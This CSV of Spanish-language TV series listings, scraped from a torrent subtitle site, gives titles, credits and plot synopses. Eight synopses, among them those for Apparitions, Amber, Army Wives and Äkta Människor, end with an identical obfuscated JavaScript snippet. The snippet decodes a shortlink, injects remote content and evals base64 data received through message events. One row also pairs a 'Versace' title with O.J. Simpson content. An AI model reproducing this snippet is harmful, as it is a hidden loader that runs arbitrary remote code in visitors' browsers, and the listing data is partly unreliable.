Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/babylon-berlin/,Babylon Berlin,"
                       Título original
    Babylon Berlin (TV Series) 
Año
    2017
Duración
    45 min.
País
    Alemania Alemania
Dirección
    Tom Tykwer (Creator), Achim von Borries (Creator), Henk Handloegten (Creator), Tom Tykwer, Achim von Borries, Henk Handloegten 
Guion
    Tom Tykwer, Achim von Borries, Henk Handloegten, Volker Kutscher (Novela: Volker Kutscher)
Música
    Johnny Klimek, Tom Tykwer
Fotografía
    Bernd Fischer, Frank Griebe, Philipp Haberlandt
Reparto
    Waléra Kanischtscheff, Volker Bruch, Liv Lisa Fries, Dmitri Alexandrov, Denis Burgazliev, Oleg Tikhomirov, Anton von Lucke, Roland Wolf, Peter Schneider, Joachim Paul Assböck, Pit Bukowski, Thomas Chemnitz, Christoph Bertram, Matthias Brandt, David Brückner 
Productora
    X Filme Creative Pool / ARD degeto / Beta Film / Sky
Género
    Serie de TV. Drama | Crimen. Años 20 						","
Descripcion
Berlín, 1929. La capital alemana se sitúa como la gran metrópolis de la expresión y la libertad. La ciudad más moderna y viva de una Europa en plena efervescencia que, sin embargo, se tambalea al borde de un cambio inminente. En mitad de esta tensa calma se encuentra Gereon Rath, un detective de la policía de Colonia que acaba de incorporarse a la unidad de antivicio y costumbres de Berlín, localizada en el monumental cuartel general de la policía, para investigar el caso de una red de pornografía relacionado con la mafia rusa.
"
https://www.subtorrents1.com/series/american-crime-story-the-people-v-o-j-simpson/,American Crime Story: Versace,"
                       Título original: American Crime Story: The People v. O.J. Simpson
Año: 2016
País: Estados Unidos
Director: Ryan Murphy (Creator)
Guión: Ryan Murphy, Scott Alexander, Larry Karaszewski, Jeffrey Toobin
Productora: 20th Century Fox Television / Ryan Murphy Productions / Color Force
Género: Intriga | Crimen. Biográfico

Capítulos: 10


Reparto:

Cuba Gooding Jr. ... O.J. Simpson
David Schwimmer ... Robert Kardashian
Sarah Paulson ... Marcia Clark
John Travolta ... Robert Shapiro
Courtney B. Vance ... Johnny Cochran
Sterling K. Brown ... Christopher Darden
Kenneth Choi ... Judge Ito
Bruce Greenwood ... Gil Garcetti
Gbenga Akinnagbe ... Dennis Schatzman
Rob Morrow ... Barry Scheck
Nathan Lane ... F. Lee Bailey						","
Descripcion
American Crime Story contará cada temporada una historia sobre algunos de los crímenes más conocidos de la historia de Estados Unidos.
La primera tanda de capítulos, American Crime Story: The People Vs O J Simpson, estará basada en el libro de Jeffrey Toobin The Run of His Life: The People V. O.J. Simpson y tendrá como eje central el controvertido caso del deportista O.J. Simpson, quien, a pesar de las pruebas que lo incriminaban en un doble homicidio, fue declarado inocente por el jurado popular. Contará el proceso judicial desde la perspectiva del abogado de Simpson y mostrará todas las maniobras y estrategias utilizadas por ambas partes para conseguir sus objetivos.
Nueva producción de Ryan Murphy, tras el éxito de la saga American Horror Story, para FX.
"
https://www.subtorrents1.com/series/apparitions/,Apparitions,"
                       Drama - Fantasía 						","
Descripcion
El padre Jacob, un sacerdote católico que trabaja para promover candidatos a la santidad, cuenta con una talento especial para exorcizar. El sabe que tiene un don, pero está más interesado en su tarea de sumar santos a la iglesia católica. Sin embargo, cuando comienza a desarrollarse una oscura batalla entre el bien y el mal que amenaza el futuro de la humanidad, no le quedará otra que obedecer al llamado del deber.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/aquarius/,Aquarius,"
                       Título original: Aquarius
Año: 2015
País: Estados Unidos
Director: John McNamara (Creator),  Jonas Pate, Michael Zinberg, Jon Amiel,  Roxann Dawson, John Dahl
Guión: John McNamara, Sera Gamble, Alexandra Cunningham, David Reed
Música: W.G. Snuffy Walden
Fotografía: Lukas Ettlin, Michael Stecher
Productora: NBC
Género: Drama, Crimen, Sectas. Basado en hechos reales

Capítulos: 13


Reparto:

David Duchovny ... Sam Hodiak
Gethin Anthony ... Charles Manson
Brian F. O'Byrne ... Ken Karn
Chance Kelly ... Ed Cutler
Claire Holt ... Charmain Tully
Emma Dumont ... Emma Karn
Gaius Charles ... Bunchy Carter
Grey Damon ... Brian Shafe
Michaela McManus ... Grace Karn
Tara Lynne Barr ... Katie 
","
Descripcion
En 1967, cuando la hija adolescente de un respetado abogado desaparece, el detective de homicidios Sam Hodiak (David Duchovny) comienza a investigar pero pronto descubre que los policías no son bien vistos por los hippies de la época, por lo que recluta la ayuda de Brian Shafe, un rebelde policía encubierto. No pasa mucho tiempo antes de que se encuentren con el líder de una secta que busca a mujeres vulnerables que se unan a su causa. A partir de ahí, siguen el rastro de este hombre en un abismo de drogas, sexo y asesinatos. Drama policíaco de trece episodios que explora los inicios del conocido criminal Charles Manson.

"
https://www.subtorrents1.com/series/anne/,Anne,"
                       Título original: Anne
Año: 2017
País: Canadá
Director: Niki Caro,  David Evans,  Amanda Tapping
Guion: Moira Walley-Beckett (Novela: Lucy Maud Montgomery)
Música: Ari Posner
Fotografía: Bobby Shore
Productora: Netflix / CBC
Género: Drama

Capítulos: 8


Reparto:

Amybeth McNult ... Anne Shirley
Geraldine James ... Marilla Cuthbert
R.H. Thomson ... Matthew Cuthbert
Lucas Jade Zumann ... Gilbert Blythe
Dalila Bela ... Diana Barry
Corinne Koslo ... Rachel Lynde
Aymeric Jett Montaz ... Jerry Baynard						","
Descripcion
Anne Shirley es una niña huérfana que vive en un pequeño pueblo llamado Avonlea que pertenece a la Isla del Príncipe Eduardo, en el año 1890. Después de una infancia difícil, donde fue pasando de orfanato a hogares de acogida, es enviada por error a vivir con una solterona y su hermano. Cuando cumple 13 años, Anne va a conseguir transformar su vida y el pequeño pueblo donde vive gracias a su fuerte personalidad, intelecto e imaginación.
"
https://www.subtorrents1.com/series/animal-practice/,Animal Practice,"
                       Título Original: Animal Practice
Creador: Alessandro Tanaka y Brian Gatewood
Producción Ejecutiva: Scot Armstrong, Brian Gatewood, Ravi Nandan, Anthony Russo, Joe Russo y Alessandro Tanaka
Estudio: Universal Television
Género: Comedia
Temporada: 1ª  
Episodios: 13
Fecha de estreno: 26 de septiembre de 2012
Distribución: Universal
Horario de emisión: Miércoles 8.30 p.m.

Reparto:
Justin Kirk ... George Coleman
JoAnna Garcia ... Dorothy Crane
Bobby Lee ... Kim Yamamoto
Tyler Labine ... Doug Jackson
Kym Whitley ... Juanita
Betsy Sodaro ... Angela						","
Descripcion
Animal Practice es una comedia centrada en el doctor George Coleman, un conocido veterinario con una impresionante lista de animales famosos como pacientes. Trabaja en el Crane Animal Hospital, una animada clínica veterinaria de la ciudad de Nueva York en la que, habitualmente, parece que son los pacientes los que dirigen el centro. Pero para su desgracia, George descubre que su ex-novia, Dorothy Crane, acaba de heredar el negocio familiar y ahora es su nueva jefa. Inteligente y ambiciosa, Dorothy pondrá la clínica patas arriba para poner orden y chocará con la forma de trabajar de George, más orientada al bienestar animal.
Conoce al doctor George Coleman (Justin Kirk, Weeds), es uno de los veterinarios más prestigiosos de Nueva York. A pesar de sus métodos poco ortodoxos, el éxito de George llega del hecho de que tiene un don innegable con los animales de todo tipo… excepto, claro, los de raza humana. Su filosofía de trabajo es estar rodeado de un ""orden desordenado"". O por decirlo de otra manera, si la sala de espera está llena mientras le grita al dueño de uno de sus pacientes, que así sea.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/american-dad/,American Dad,"
                       Título Original: American Dad
Creador: Seth MacFarlane, Mike Barker y Matt Weitzman
Producción Ejecutiva: Seth MacFarlane, Mike Barker y Matt 
Estudio: FOX
Género: Animación
temporada: 7ª
Horario de emisión: Viernes 21.30

Reparto
Seth MacFarlane ... Stan, Roger
Wendy Schaal ... Francine
Scott Grimes ... Steve
Rachel MacFarlane ... Hayley
Dee Bradley Baker ... Klaus						","
Descripcion
Padre Made in USA es una visión irónica de la familia americana que encarna, llevando al extremo las obsesiones y los sin sentidos de una sociedad moderna, en especial la americana.
Stan Smith es el padre Made in USA: trabaja como agente de la CIA y vive en constante alerta por la amenaza de ataques terroristas a su país. A la cabeza de una familia disfuncional intenta trasladar la disciplina castrense a su casa, sin demasiado éxito. Eso sí, más de una vez ha agujereado con su revolver el tostador cuando éste escupía las tostadas calientes…
"
https://www.subtorrents1.com/series/atlanta/,Atlanta,"
                       Título original
    Atlanta (TV Series) 
Año
    2016
Duración
    30 min.
País
    Estados Unidos Estados Unidos
Dirección
    Donald Glover (Creator), Hiro Murai, Donald Glover, Janicza Bravo 
Guion
    Donald Glover, Stephen Glover, Jamal Olori, Stefani Robinson, Fam Udeorji
Música
    Ludwig Göransson
Fotografía
    Christian Sprenger
Reparto
    Donald Glover, Emmett Hunter, Keith Stanfield, Terri Abney, Jane Adams, Lucius Baston, Zazie Beetz, Precious Bright, Deaven Brooks, Jessica A. Caesar, Roy Coulter, Elizabeth Davidovich, Crystal Alicia Garrett, Chris Greene, Derrick Haywood, Key Jones, Isiah Whitlock Jr. 
Productora
    Emitida por FX; FX Productions
Género
    Serie de TV. Comedia. Drama | Música. Hip Hop 						","
Descripcion
En la ciudad de Atlanta, dos primos afroamericanos se meten en el mundo del rap. Su evolución profesional será complicada por su diferente percepción de lo que es el arte, el producto, el éxito y otras cosas.
"
https://www.subtorrents1.com/series/american-gods/,American Gods,"
                       Título original: American Gods (TV Series)
Año: 2017
País: Estados Unidos
Director: Bryan Fuller (Creator),  Michael Green (Creator),  David Slade,  Adam Kane, Vincenzo Natali,  Guillermo Navarro,  Floria Sigismondi,  Craig Zobel
Guion: Bryan Fuller, Michael Green, Robert Richardson (Novela: Neil Gaiman)
Música: Brian Reitzell
Fotografía: Jo Willems
Productora: Emitida por Starz; Fremantle Media North America
Género: Drama, Fantasía

Capítulos: 8


Reparto:

Ricky Whittle ... Shadow Moon
Emily Browning ... Laura Moon / Essie Tregowan
Crispin Glover ... Mr World
Bruce Langley ... Technical Boy
Yetide Badaki ... Bilquis
Pablo Schreiber ... Mad Sweeney
Ian McShane ... Mr. Wednesday						","
Descripcion
Un ex convicto llamado Shadow se encuentra con un misterioso hombre que se hace llamar ""Wednesday"" y que sabe más de lo que parece a primera vista sobre la vida y el pasado de Shadow. Quien se convierte en el compañero de viaje de quien resulta ser uno de los dioses más viejos que tratan de reclutar tropas para combatir a los dioses advenedizos. Basada en la novela de Neil Gaiman.
"
https://www.subtorrents1.com/series/amber/,Amber,"
                       Título original: Amber
Año: 2014
Duración: 60 min.
País: Irlanda
Director: Rob Cawley (Creator),  Paul Duane (Creator),  Thaddeus O'Sullivan
Guión: Rob Cawley, Paul Duane, Gary Duggan
Fotografía: Peter Robertson
Productora: Emitida por la cadena RTÉ; Screenworks
Género: Drama | Secuestros / Desapariciones 
Temporada: 1
Capítulos: 4

Reparto:
Eva Birthistle,  
David Murray,  
Lauryn Canny,  
Levi O'Sullivan,  
Justine Mitchell,  
David Herlihy,  
Declan Conlon,  
Emily Nagle,  
Stella McCusker,  
Shauna Griffith,  
Aoife Maloney,  
Gary Whelan,  
Janice Byrne,  
Laura Jane Laughlin,  
Eleanor Methven,  
Eric Lalor,  
Con Murphy,  
Ned Dennehy,  
Dan Li,  
Stephen Jones,  
Vinny Murphy,  
Aenne Barr

","
Descripcion
Los padres de Amber, Ben y Sarah, se han divorciado hace poco y rehacen de nuevo sus vidas. Pero todo cambia bruscamente cuando Amber no regresa a casa tras pasar la tarde en casa de una amiga.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/aqui-en-la-tierra/,Aquí en la Tierra,"
                       Título original
    Aquí en la Tierra (TV Series) 
Año
    2018
Duración
    60 min.
País
    México México
Dirección
    Everardo Gout, Alonso Ruizpalacios, Mariana Chenillo, Gael García Bernal, Adrian Grunberg 
Guion
    Jorge Dorantes, Kyzza Terrazas, Jacques Bonnavent
Fotografía
    Jaime Reynoso
Reparto
    Alfonso Dosal, Tenoch Huerta, Paulina Dávila, Daniel Giménez Cacho, Gael García Bernal, Ariadna Gil, Yoshira Escárrega, Sofía Sisniega, Ezequiel Diaz, Teresa Ruiz, Guillermo Ríos, Francisco Barreiro, Aidan Vallejo, Andrés Almeida, Rodrigo Azuela, Gilberto Barraza, Zure Don Pablo, José Carlos Rodríguez, Ángeles Cruz, Hoze Meléndez, Gerardo Trejoluna, Mayahuel del Monte, José Ángel García, Alejandra Guilmant, Héctor Holten, David Illescas, Daniela Luque, Rodrigo Murray, Pamela Almanza, Everardo Arzate, Baltimore Beltran, Pablo Chemor, María Evoli, San Rat Fer, Leonardo Ortizgris, Solana Azulay, Alejandro Cuétara, Alan Del Castillo, Natasha Dupeyrón, Pedro Hernández, Diego Jáuregui, Claudia Lobo, Oscar Narvaez, Ana Terán, Estefania Villarreal, Dettmar Yañez 
Productora
    La Corriente del Golfo / Fox Networks Group Latin America. Distribuida por Fox Networks Group Latin America
Género
    Serie de TV. Thriller. Drama | Crimen 
","
Descripcion
Gira en torno a los crímenes y secretos de una de las familias más influyentes de México, de cómo un joven humilde salta las barreras sociales para ascender en la escala económica y política, y sobre la concientización de un joven heredero que lucha por aclarar el asesinato de su padre, en un México muy parecido al de hoy, pero lejos de ser el mismo.
"
https://www.subtorrents1.com/series/axe-cop/,Axe Cop,"
                       Axe Cop
Classification: Animation
Genre: Animation General | Comedy | Crime | Drama | Family
Status: New Series
Network: FOX ( USA)
Airs: Saturdays at 11:00 pm
Runtime: 15 Minutes
Premiere: July 21, 2013
Episode Order: 6						","
Descripcion
Todo buen connoisseur de webcómics sabe de Axe Cop, la épica historieta de los hermanos Nicolle. Si aún no la conoces, te estás perdiendo de una de las tiras más alocadas que existen en la web. Tanto, que la Fox anunció hace seis meses que tomaría al personaje y le daría su propia serie animada, la cual introduciría en un bloque de programación para adultos que compita con Adult Swim de Cartoon Network.
Si les ha parecido un tanto absurdo, ¡ése es el punto! Axe Cop es una historieta escrita por un chico de ocho años (Malachai Nicolle, quien tenía cinco cuando empezó el cómic) y dibujada por su hermano mayor de 31, Ethan. Después de muchas críticas positivas en la red, Ethan consiguió que la editorial Dark Horse publicara el cómic en formato impreso. De ahí, llamó la atención de Nick Weidenfeld, quien intentó (sin éxito) obtener los derechos para Adult Swim.
"
https://www.subtorrents1.com/series/911/,911,"

Título original
    9-1-1 (TV Series)
Año
    2018
País
    Estados Unidos
Dirección
    Ryan Murphy (Creator), Brad Falchuk (Creator)
Reparto
    Angela Bassett, Peter Krause, Kenneth Choi, Connie Britton, Aisha Hinds, Rockmond Dunbar, Oliver Stark
Productora
    20th Century Fox Television / Ryan Murphy Television / Brad Falchuk Teley-Vision
Género
    Serie de TV. Drama | Basado en hechos reales 						","
Descripcion
9-1-1 es un drama basado en hechos reales que explora la ajetreada profesión y vida del personal que opera detrás de la línea de emergencia 911. A través de ella, policías, paramédicos y bomberos reciben llamadas de urgencias diarias por las que rápidamente deben acudir y poner en riesgo su vida para salvar la de otros.
"
https://www.subtorrents1.com/series/a-young-doctors-notebook-miniserie/,A Young Doctor's Notebook (Miniserie),"
                       TÍTULO ORIGINAL. A Young Doctor's Notebook
AÑO: 2013
PAÍS. Reino Unido
DIRECTOR: Alex Hardcastle
GUIÓN. Mikhail A. Bulgakov
FOTOGRAFÍA. Simon Vickery
GÉNERO. Drama | Miniserie de TV
Capítulos: 4

REPARTO. Jon Hamm, Daniel Radcliffe
PRODUCTORA. Big Talk Productions
","
Descripcion
Basada en los relatos de semi-autobiográficos del escritor ruso Mijail Bulgakov, la miniserie se centra en un médico después de la Primera Guerra Mundial, inspirado por el propio  Bulgakov, trabajando como médico en una pequeña aldea rusa. El protagonista tendrá dificultades para hacer frente tanto a sus pacientes como a sus propios demonios internos, y su yo joven contemporáneo frecuentemente conversa con su yo mayor.
La miniserie está dividida en cuatro partes y está dirigida por Alex Hardcastle. Se estrenó el 06 de diciembre en el canal británico Arts Sky y será distribuida internacionalmente por BBC Worldwide.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/army-wives/,Army Wives,"
                       Título Original: Army Wives
Creador: Katherine Fugate
Producción Ejecutiva: Katherine Fugate, Deborah Spera, Jeff Melvoin y Mark Gordon
Estudio: ABC Television Studio
Género: Drama
Temporada: 6ª
Episodios: 14
Lugar de rodaje: Charleston (Carolina del Sur)
Distribución: Buenavista
Audiencia temp. pasada: 3,45 millones de espectadores
Horario de emisión: Domingos 10.00 p.m.

Reparto:
Catherine Bell Denise Sherwood
Brigid Brannagh Pamela Moran
Kim Delaney Claudia Joy Holden
Brian McNamara Michael Holden
Sterling K. Brown Roland Burton
Wendy Davis Joan Burton
Drew Fuller Trevor LeBlanc
Sally Pressman Roxy LeBlanc
Jeremy Davidson Chase Moran
Terry Serpico Frank Sherwood
Rhoda Griffis Lenore Baker
","
Descripcion
De manos de The Mark Gordon Company y ABC Television Studios llega Army Wives, una nueva serie sobre los problemas, los sueños y las amistades de un diverso grupo de mujeres — y un hombre– que viven con sus esposos y familias en una activa base militar, y que sufren las presiones y tradiciones que impone la vida en el ejército en las personas que se quedan en casa, mientras sus allegados sirven a su país.
La vida de esposa de un militar nunca es aburrida, especialmente la de las protagonistas de esta serie. Se enfrentarán a todo tipo de retos y desafíos tratando de encajar en el mundo militar, intentando mantener el contacto con sus seres queridos en el frente, y soportando las estrictas tradiciones militares, lo que las llevará a formar una insólita alianza para ayudarse entre ellas a pasar por las situaciones más inimaginables y proteger sus secretos más oscuros.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/about-a-boy/,About a Boy,"
                       Título Original: About A Boy
Creador: Jason Katims
Producción Ejecutiva: Jason Katims, Jon Favreau, Tim Bevan, Eric Fellner, Liza Chasin, Robert De Niro y Jane Rosenthal
Estudio: Universal Television
Género: Comedia
Temporada: 1ª temporada
Episodios: 13
Fecha de estreno: 22 de febrero de 2014
Distribución Universal
Horario de emisión Martes 9.00 p.m.

Reparto
David Walton ... Will Freeman
Minnie Driver ... Fiona Brewer
Benjamin Stockham ... Marcus Brewer
Al Madrigal ... Andy
Annie Mumolo ... Laurie						","
Descripcion
Tras escribir una canción que ha sido un éxito, Will Freeman ha pegado el pelotazo y podrá vivir de las rentas el resto de su vida. Está soltero, no trabaja, y es feliz. Pero todo dará un vuelco cuando Fiona, una madre soltera y su encantador hijo de 11 años se muden a la casa de al lado.
"
https://www.subtorrents1.com/series/bad-guy/,Bad Guy,"
                       Título original
    Nappeun Nyeoseokdeul (TV Series)
Año
    2014
Duración
    60 min.
País
    Corea del Sur Corea del Sur
Dirección
    Jung-min Kim 
Guion
    Jung-hoon Han
Reparto
    Dong-seok Ma, Hae-Jin Park, Ye-won Kang, Sang Jung Kim, Dong-Hyuk Cho, Shin-il Kang, Hyo-jun Park, Byeong-chun Kim, Hye-Yoon Kim, Tae-hoon Kim, Seong-Eon Lim, Jia Min, Jung-Hak Park, Seung-eon Hwang, Min Kwon, Choe Min 
Género
    Serie de TV. Thriller | Venganza. Asesinos en serie. Crimen 						","
Descripcion
Un inspector de policía pide la puesta en libertad de tres peligrosos reclusos para que se unan a la lucha contra el crimen.
"
https://www.subtorrents1.com/series/alpha-house/,Alpha House,"
                       Título original: Alpha House
Año: 2013
País: Estados Unidos
Director: Adam Bernstein 
Guión: Garry Trudeau 
Música: Anton Sanko
Fotografía: Matthew J. Lloyd
Productora: Amazon Studios
Género: Comedia. Drama | Política 


Reparto:

John Goodman,  
Clark Johnson,  
Matt Malloy,  
Mark Consuelos,  
Yara Martinez,  
Alicia Sable,  
Brooke Bloom,  
Kobi Libii,  
Julie White,  
Chance Kelly,  
Ben Rameaka,  
Haley Joel Osment,  
Bjorn Dupaty,  
Matty Blake,  
Tracy Howe 

","
Descripcion
Cuatro senadores republicanos comparten la misma casa de alquiler en DC, y se enfrentan a batallas de reelección, acusaciones y fiestas – todo con sentido del humor. (function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/american-horror-story/,American Horror Story,"
                       Título Original: American Horror Story
Creador: Ryan Murphy y Brad Falchuk
Producción Ejecutiva: Dante Di Loreto, Brad Falchuk y Ryan Murphy
Estudio: 20th Century Fox Television
Género: Terror
Temporadas: 2ª
Episodios: 13
Lugar de rodaje: Los Angeles
Sintonía: American Horror Story Theme - Charlie Clouser
Distribución: Fox
Audiencia temp. pasada: 2,81 millones de espectadores
Horario de emisión: Miércoles 10.00 p.m.

Reparto:
Dylan McDermott ... Ben Harmon
Connie Britton ... Vivien Harmon
Evan Peters ... Tate Langdon
Taissa Farmiga ... Violet Harmon
Denis O'Hare ... Larry Harvey
Jessica Lange ... Constance
Frances Conroy ... Moira
Alex Breckenridge ... Moira
Jamie Brewer ... Addy						","
Descripcion
American Horror Story es una apasionante serie que nos presenta a los Harmon, quien a primera vista son una familia perfecta. Pero las apariencias pueden ser engañosas. Después de haber sufrido un brutal aborto espontáneo y un episodio de infidelidad conyugal, un matrimonio y su hija adolescente deciden mudarse de Boston a Los Angeles, en un intento por dejar atrás los recuerdos del pasado. Sin embargo, aunque su nueva propiedad inicialmente parece ser la casa ideal, se trata de una mansión encantada que alberga un gran número de oscuros secretos que cambiarán la vida de los Harmon para siempre.
Ben Harmon (Dylan McDermott, El abogado) es un sensible psiquiatra que tiene problemas para entender a su propia familia. Se esfuerza por mantenerse fiel a su esposa, pero después del aborto que sufrió ella, mantuvo una aventura con una de sus estudiantes. Es un esfuerzo por no perder a su familia, acepta mudarse al otro lado del país para empezar de nuevo. Pero su pasado seguirá atormentándolo… igual que su nueva casa. La atractiva esposa de Ben, Vivien (Connie Britton, Friday Night Lights) fue quien descubrió a su marido en plena infidelidad. Aunque ahora pelea por superar su bajo líbido, le rodea un halo de seducción y algo en su nuevo hogar le despierta la curiosidad.
"
https://www.subtorrents1.com/series/arthdal-chronicles/,Arthdal Chronicles,"
                       Titulo Original: Arthdal Chronicles 
Titulo Español: Arthdal Chronicles 
Año: 2019 
Genero: Drama, Fantasia 
Promedio De Duracion: 50 Minutos 
Pais: Corea del Sur
Clasificacion: Mayores de 12 Años 						","
Descripcion
En la tierra mítica llamada Arth, los habitantes de la legionaria ciudad Arthdal y regiones de los alrededores buscan el poder mientras forman una nueva sociedad. Eun Som es un niño de Blue Stone Village que nace maldecido bajo una señal de mal agüero. Años más tarde, se convertirá en el conquistador de Asadal, convirtiéndolo en un imperio. Ta Gon, un ambicioso y estratégico héroe de guerra, planea convertirse en el primer Rey de Asadal. Eu Som se enamora de Tan Ya, una mujer que, como él, fue maldecida en su nacimiento y, a pesar de todo, se convierte en la primera política femenina de Asadal.
"
https://www.subtorrents1.com/series/arvingerne/,Arvingerne,"
                       Título original: Arvingerne 
Año: 2014
País: Dinamarca
Director: Maya Ilsøe (Creator),  Pernilla August,  Louise Friedberg,  Jesper Christensen,  Heidi Maria Faisst,  Mads Kamp Thulstrup
Guión: Maya Ilsøe, Maja Jul Larsen, Anders Frithiof August, Per Daumiller, Lolita Belstar, Karina Dam, Lasse Kyed Rasmussen
Música: Magnus Jarlbo, Sebastian Öberg
Productora: Emitida por la cadena DR1; Danmarks Radio (DR)
Género: Drama | Familia 

Temporada: 1
Capítulos:10 

Reparto:

Trine Dyrholm ... Gro Grønnegaard
Carsten Bjørnlund ... Frederik Grønnegaard
Mikkel Boe Følsgaard ... Emil Grønnegaard
Marie Bach Hansen ... Signe Larsen
Jesper Christensen ... Thomas Konrad
Kenneth M. Christensen ... Andreas Baggesen
Lene Maria Christensen ... Solveig Riis Grønnegaard
Trond Espen Seim ... Robert Eliassen						","
Descripcion
Arvingerne (The Legacy) es una nueva serie danesa producida por la cadena DR, creada por el extraordinario equipo detras de los éxitos Forbrydelsen y Borgen. Es una serie dramática que sigue la historia de una familia danesa que vive en el sur del país, siendo una granja familiar el escenario de la trama.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/akta-manniskor/,Äkta Människor,"
                       Titulo de la serie original: Äkta Människor
Titulo de la serie en inglés: Real Humans
Director: Levan Akin
Writer: Lars Lundström
Year: 2012
Genres: Drama | Sci-Fi 
Country: Sweden
Language: Swedish
Production Co: Matador Film AB, Sveriges Television (SVT) 

Temporada: 1
Capítulos: 10

Temporada: 2
Capítulos: 10

Stars:
Andreas Wilson, Lisette Pagler and Pia Halvorsen 						","
Descripcion
En un presente paralelo, la humana artificial ha entrado en su cuenta. Los robots ya no tienen nada como un robot sobre ellos. Las nuevas tecnologías y avances en el campo de la ciencia han hecho posible la fabricación de un producto – una especie de siervo mecanizada – que es tan similar a un ser humano real que puede ser considerado un sustituto perfecto estado. El Robot Humano (HUBOT) también han dado lugar a nuevos problemas y dilemas. Espinosas cuestiones jurídicas cada vez más comenzaron a ocupar las mentes de la gente y todavía están a la espera de ser contestada: ¿Quién es responsable de las acciones de un hubot? ¿Es hubots tienen algún tipo de ""derechos"" hubot? En caso de que se paga por su trabajo? Como un número cada vez mayor de personas que establecen relaciones con hubots, los límites entre el hombre y la máquina se confunden. Cuando los seres humanos hacen copias de sí mismos, que son tan cercanos a la realidad que establecer vínculos emocionales, las preguntas que se plantea – ¿Qué es lo que realmente significa ser ""humano""? (Traductor google)(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
